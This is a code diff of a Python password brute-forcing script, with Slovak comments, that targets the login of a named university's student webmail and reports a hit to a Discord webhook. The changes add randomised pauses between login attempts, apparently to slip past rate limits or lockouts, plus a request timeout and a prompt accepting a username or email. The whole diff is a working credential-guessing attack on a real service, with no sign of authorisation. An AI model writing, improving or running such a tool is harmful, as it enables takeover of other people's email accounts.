@@ -1,8 +1,9 @@
 import requests
 import sys
+import time
+import random
 
-username = input("[*] Zadaj username: ")  
-
+username = input("[*] Zadaj username alebo email: ")  
 
 url = "https://studentmail.ukf.sk/webmail/"           
 discord_webhook = ""                  # webhook URL pre Discord notifikacie
@@ -24,7 +25,7 @@ def notify_discord(message):
     try:
         requests.post(discord_webhook, json={"content": message})
     except Exception as e:
-        print(f"[-] Error: Chyba pri odosielani na Discord: {e}")
+        print(f"Chyba pri odosielani na Discord: {e}")
 
 # Funkcia, ktora posiela POST request pre login, potrebne ponechat aj action, timezone, url, inak nepride k loginu
 def try_login(user, password): 
@@ -42,7 +43,7 @@ def try_login(user, password):
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
     }
     # posle request bez sledovania redirectu (allow_redirects=False)
-    resp = requests.post(url, data=data, headers=headers, cookies=cookies, allow_redirects=False)
+    resp = requests.post(url, data=data, headers=headers, cookies=cookies, allow_redirects=False, timeout=10)
     return resp
 
 # Hlavny loop, ktory testuje hesla zo zoznamu 
@@ -60,4 +61,5 @@ for pw in payloads:
         break                
     else:
         print(f"[FAIL] {pw} | status: {resp.status_code}")  
-
+    
+    time.sleep(random.uniform(0.8, 1.5))  # Pauza medzi 0.8 a 1.5 sekundy
